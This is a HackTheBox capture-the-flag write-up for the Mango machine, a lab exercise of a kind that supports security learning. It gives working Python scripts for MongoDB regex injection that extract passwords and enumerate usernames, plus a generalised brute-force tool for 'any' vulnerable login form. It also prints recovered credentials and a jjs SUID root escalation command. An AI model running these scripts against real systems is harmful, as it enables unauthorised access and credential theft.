<p>Hello everyone!</p>

<p>Today, I'm publishing a writeup for <a href="https://www.hackthebox.eu">HackTheBox</a>'s machine Mango, made by
    <a href="https://www.hackthebox.eu/home/users/profile/13531">MrR3boot</a>. This machine was harder for me than the previous ones, thus it allowed me to learn a lot
    of new interesting concepts.<!--more--></p>

<p>Let's start! First, as usual, I'll put Mango's IP address in my <code>/etc/hosts</code> file, so that this box will
    be called <code>mango.htb</code>. We'll start by a basic <code>nmap</code> scan, which gives us the following
    result:</p>
<pre class="prettyprint nocode">

</pre>

<p>So it seems we have two websites, the first one hosted on port 80 displays a <code>403 Forbidden</code> error page; the other
    one is on port 443. Let's go to the second one, we enter in our browser the URL <code>https://mango.htb</code>:</p>

<img src="/img/{{ page.code }}/mango1.png" alt="Mango search engine" />

<p>This is a webpage looking like Google's homepage, and the only link that is working redirects to an analytics webpage.
    However, turns out this page was a rabbit hole, because we can't do anything from it.</p>

<p>One piece of detail that needed to be noticed right away was the SSL certificate: some information are given directly
    in the <code>nmap</code> scan, but it's possible to find that by reading the certificate in our browser as well. Here
    is the certificate:</p>

<figure>
    <img src="/img/{{ page.code }}/mango2.png" alt="Mango's certificate" />
    <figcaption>The picture is in french, but the only interesting information is the certificate's issuer</figcaption>
</figure>

<p>As seen in the picture, the certificate was issued by the domain <code>staging-order.mango.htb</code>. It might be worth
    checking this domain out. We enter this URL in our browser, and we land on the following webpage:</p>

<img src="/img/{{ page.code }}/mango3.png" alt="Staging order login page" />

<p>Here I was stuck for a rather long time, it was a bit hard to be able to login. The box's name gives us a big hint:
    Mango stands here for MongoDB, a DBMS based part of the NoSQL DBMS family. I assumed there was a user named <code>admin</code>,
    and I decided to write a script in order to find their credentials. This is made possible by a vulnerability
    in MongoDB: instead of passing the password field for instance, we're actually able to pass the application
    a regular expression. Let's take an example: if I want to connect to the login form using username <code>admin</code>
    and password <code>abcdef</code>, I would use a <code>POST</code> request containg the following information (JSON
    formatted):
    </p>
<pre class="prettyprint">
{
    "username": "admin",
    "password": "abcdef"
}
</pre>

<p>What we're exploiting here is the fact that instead of passing a member named <code>password</code>, I can pass to the
    form a member called <code>password[$regex]</code>, and the server will understand it as if it were the form's field
    <code>password</code>, but as a regular expression. This means that if <code>admin</code>'s password is actually
    <code>abcdef</code>, then passing the application the following data should allow me to be connected:</p>
<pre class="prettyprint">
{
    "username": "admin",
    "password[$regex]": "abc.{1}ef"
}
</pre>

<p><strong>Note:</strong> this regular expression matches a string containing <code>abc</code>, followed by any
    character one time, then <code>ef</code>.</p>


<p>When we observe the requests and responses using BurpSuite, we find out that when passing
    a regex matching the user's correct password, the application responds with a 302 instead of 200.</p>

<figure>
    <img src="/img/{{ page.code }}/mango5.png" alt="Request using valid regex" />
    <figcaption>Here we pass the regex <code>.{1}</code> which is always valid because the password
                contains at least one character.</figcaption>
</figure>
<figure>
    <img src="/img/{{ page.code }}/mango6.png" alt="Response to a valid regex" />
    <figcaption>The server responds with status code 302.</figcaption>
</figure>

<figure>
    <img src="/img/{{ page.code }}/mango7.png" alt="Request using invalid regex" />
    <figcaption>Here we pass the regex <code>.{2151513456}</code> which is unlikely to be true.</figcaption>
</figure>
<figure>
    <img src="/img/{{ page.code }}/mango8.png" alt="Response to an invalid regex" />
    <figcaption>The server responds with status code 200.</figcaption>
</figure>


<p>This allows us to write the following script in order to guess user <code>admin</code>'s password length:</p>
<pre class="prettyprint linenums">
#!/usr/bin/env python3
import requests
from colors import *

url = "http://staging-order.mango.htb/index.php"

req = requests.Session()

creds = {
    'username': 'admin',
    'password[$regex]': '.{0}'
}

response = req.post(url, creds, allow_redirects=False)

i = 1
while response.status_code == 302:
    creds['password[$regex]'] = ".{" + str(i) + "}"
    response = req.post(url, creds, allow_redirects=False)
    print("[*] [{}] Status code: {}".format(i, response))
    if response.status_code == 302:
        print("[~] Password can be at least " + str(i) + " characters long.")
        i += 1
    else:
        print("[~] Encountered 200 status code.")

print("[+] Password is " + str(i-1) + " characters long.")
</pre>

<p>This script is easy to understand: first, it tests whether the password contains the null string, which isn't really
    useful but it's the start of a recursive pattern. Then, while the server responds with a 302 status code, we test whether
    the password contains one more character. If the server responds with 200 status code to a given <code>i</code> value,
    then it means that the password does not contain a string which is <code>i</code> character long; however assuming the
    server responded with 302 status code for <code>i-1</code>, then the password should be <code>i-1</code> characters
    long.</p>

<p>Running this script, we learn that user <code>admin</code>'s password is 12 characters long. Now, using a similar
    approach, we're going to guess the actual password: we are going to test character by character, which character returns
    a 302 status code and not a 200 status code. In the following script, we make the test from the end of the password.
    For instance, if <code>admin</code>'s password is <code>abcdef</code>, then we're going to pass the following
    regular expressions to the form:</p>
<ul>
    <li><code>a$</code> : 200 status code;</li>
    <li><code>b$</code> : 200 status code;</li>
    <li><code>c$</code> : 200 status code;</li>
    <li><code>d$</code> : 200 status code;</li>
    <li><code>e$</code> : 200 status code;</li>
    <li><code>f$</code> : 302 status code.</li>
</ul>

<p>Then, as we know the password's length, we do the same process again until we have found all the characters. The
    script looks like:</p>
<pre class="prettyprint linenums">
#!/usr/bin/env python3
import requests
import urllib3
import string
from colors import Colors
urllib3.disable_warnings()

password = ""
url = "http://staging-order.mango.htb/index.php"

creds = {
    "username": "admin",
    "password[$regex]": ""
}

remaining = 12 - len(password)

while remaining > 0:
    for c in string.printable:
        if c not in ['*', '+', '.', '?', '|']:
            Colors.info("Testing end: " + str(c + password))
            Colors.note("{} characters remaining.".format(remaining))
            creds['password[$regex]'] = "{}$".format(c + password)
            r = requests.post(url, data=creds, verify=False, allow_redirects=False)
            if r.status_code == 302:
                password = c + password
                Colors.success("This password's end worked: {}".format(password))
                remaining -= 1
                break
</pre>

<p><strong>Note:</strong> in the script, we do not consider the characters <code>*</code>, <code>+</code>,
    <code>.</code>, <code>?</code> and <code>|</code> as they are special characters used by regular expressions. We
    were lucky and the user didn't use those characters in their password. However, if he had, we would have to escape
    those characters.</p>

<p>This script allows us to get the following password for user <code>admin</code>: <strong>t9KcS3>!0B#2.</strong> Using
    those credentials with the form makes us go to another page, which isn't actually interesting:</p>
<img src="/img/{{ page.code }}/mango4.png" alt="home.php page" />

<p>I was stuck for a bit, then I figured out there might be other users than <code>admin</code>: actually this user was
    found by a lucky guess. I decided to change a little the previous script in order to enumerate users using the
    exact same approach as before: I put in the password field the regular expression <code>.{0}</code> which is always
    true, and I used the same script as before to find a username. This script isn't very efficient because it used an
    infinite loop: I stop manually the script when I find a username that I think might work. In addition, in order not
    to find the same username twice, I iterate over <code>string.printable</code> in natural order, then in reverse order.
    This approach is very limited and allows us to guess only two usernames, but here it is enough:</p>
<pre class="prettyprint linenums">
import requests
import urllib3
import string
import urllib
from colors import Colors
urllib3.disable_warnings()

u="http://staging-order.mango.htb/index.php"

creds = {
    "username[$regex]": "",
    "password[$regex]": ".{0}"
}

while True:
    for c in reversed(string.printable):
        if c not in ['*','+','.','?','|','^','$']:
            Colors.info("Testing end: " + str(c + password))
            creds['username[$regex]'] = "{}$".format(c + password)
            r = requests.post(u, data = creds,verify = False, allow_redirects = False)
            if r.status_code == 302:
                password = c + password
                Colors.success("This user's end worked: {}".format(password))
                break
</pre>

<p>Iterating over <code>string.printable</code> using the natural order, we find the username <code>admin</code>; in reverse
    order, we find a username <code>mango</code>. Using the password-guessing script from before, we easily find this user's
    password: <strong>h3mXK8RhU~f{]f5H</strong>.</p>

<p>When we login using the form, we land on the same page as before. However, with a lucky guess, we might think that user
    <code>mango</code> is a real user on the machine: let's try to log in over SSH with those credentials.</p>
<pre class="prettyprint nocode">
$ ssh mango@mango.htb
mango@mango.htb's password: <span style="color: #6D071A; font-weight: bold;">h3mXK8RhU~f{]f5H</span>
mango@mango:~$ ls -la

</pre>

<p>It worked! But there is no <code>user.txt</code> here... Let's take a look at the <code>/home</code> directory:</p>
<pre class="prettyprint nocode">
mango@mango:~$ ls /home
admin mango
</pre>

<p>Guess we have to gain access to <code>admin</code>'s home directory after all. We're going to try using the password
    we guessed earlier:</p>
<pre class="prettyprint nocode">
mango@mango:~$ su admin
Password: <span style="color: #6D071A; font-weight: bold;">t9KcS3>!0B#2</span>
$ id
uid=4000000000(admin) gid=1001(admin) groups=1001(admin)
$ cat /home/admin/user.txt
79bf3[-- REDACTED --]47e92
</pre>

<p>It works, and now we owned user! Now, let's move on to owning root.</p>

<p>To do so, we're going to learn about a very useful script: <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite">linpeas</a>.
    It is a script that enumerates a lot of interesting things in an operating system we wish to privilege escalate in.
    Running this script in Mango, we notice the following interesting part:</p>
<pre class="prettyprint nocode">
[+] SUID
[.. Many lines ..]
/usr/lib/jvm/java-11-openjdk-amd64/bin<span style="background-color: yellow; color: red;">/jjs</span>
[.. Many lines ..]
</pre>

<p>The red text on yellow background color code means that linpeas found something that is really worth
    checking out. In fact, we learn in this section that the program <code>jjs</code> has the SUID flag set, which means
    it should be possible to execute it with root privilege. Let's take a look at <code>jjs</code>'
    <a href="https://gtfobins.github.io/gtfobins/jjs/">GTFObins</a>' page: we are given the following command that should
    spawn a shell:</p>
<pre class="prettyprint nocode">
echo "Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)').waitFor()" | jjs
</pre>

<p>Basically, we are using Java in order to run <code>sh</code> and redirecting stdin, stdout and stderr accordingly. This
    code is then piped to <code>jjs</code> which runs it. However, using this very command doesn't work on our system, for
    a reason I couldn't really understand, thus I modified it in order to make it just print the flag. Basically, if you can
    do that, then you could run any command as root, so it is a valid root own:</p>
<pre class="prettyprint nocode">
$ echo "Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc \$@|sh\${IFS}-p _ echo cat /root/root.txt >$(tty) 2>$(tty)').waitFor()" | jjsWarning: The jjs tool is planned to be removed from a future JDK release
jjs> Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc $@|sh${IFS}-p _ echo cat /root/root.txt >/dev/pts/5 2>/dev/pts/5').waitFor()
8a8ef[-- REDACTED --]9ab15
0
jjs> $
</pre>

<p><strong>Note:</strong> <code>jjs</code> can be run as root only from user <code>admin</code>.</p>

<p>So we finally owned root! This box was really fun, and way harder for me than the boxed I owned before. It was a really
    interesting experience, and I think it's the first time I actually have to make my own scripts from zero to own
    the box.</p>
<p>So this is over for this box! If you have any comments or suggestions, feel free to open an issue on <a href="https://github.com/Rubytox/Rubytox.github.io">this website's GitHub page</a>.</p>

<h3>Appendix</h3>

<p>Here you can find a complete script that guesses the password length for a given username passed through command line,
    then tries to guess the password. This script should work for any login form that has the same vulnerability:</p>
<pre class="prettyprint linenums">
#!/usr/bin/env python3
import requests
import sys
import string
from colors import *


def password_length(username, url):
    req = requests.Session()
    creds = {
        'username': username,
        'password[$regex]': '.{0}'
    }

    response = req.post(url, creds, allow_redirects=False)

    i = 1
    while response.status_code == 302:
        creds['password[$regex]'] = ".{" + str(i) + "}"
        response = req.post(url, creds, allow_redirects=False)
        if response.status_code == 302:
            Colors.info("Password can be at least " + str(i) + " characters long.", end='')
            print("\r", end='')
            i += 1
        else:
            print()
            Colors.info("Encountered 200 status code.")

    Colors.success("Password is " + str(i-1) + " characters long.")
    return i-1


def guess_password(username, url):
    remaining = password_length(username, url)
    password = ""
    creds = {
        'username': username,
        'password[$regex]': '.{0}'
    }

    while remaining > 0:
        for c in string.printable:
            if c not in ['*', '+', '.', '?', '|']:
                output = "Remaining {} characters | Testing end: {}"
                Colors.info(output.format(remaining, c), end='')
                print(Colors.BGREEN + password + Colors.NONE, end='')
                print('\r', end='')
                creds['password[$regex]'] = "{}$".format(c + password)
                r = requests.post(url, data=creds, verify=False, allow_redirects=False)
                if r.status_code == 302:
                    password = c + password
                    remaining -= 1
                    break
    print()
    return password


def main():
    username = sys.argv[1]
    url = sys.argv[2]

    password = guess_password(username, url)
    Colors.success("Found password: {}".format(password))


if __name__ == "__main__":
    if len(sys.argv) != 3:
        usage = """Usage: {} username url
\t- username : \tthe username of the user whose password we want to guess
\t- url : \tthe url to the vulnerable login form """.format(sys.argv[0])
        Colors.fail(usage)
        exit(1)
    main()
</pre>

<p>Assuming the script is called <code>bruteforce.py</code>, you would run it against Mango box's user <code>admin</code>
    the following way:</p>
<pre class="prettyprint nocode">
./bruteforce.py admin "http://staging-order.mango.htb/index.php"
</pre>

<p><strong>Note:</strong> In my scripts I use a lot of functions from the <code>Colors</code> class. I discuss about
    that in the following article: <a href="{% post_url /articles/2020-02-27-Python_colors %}">Python Colors package</a>.</p>
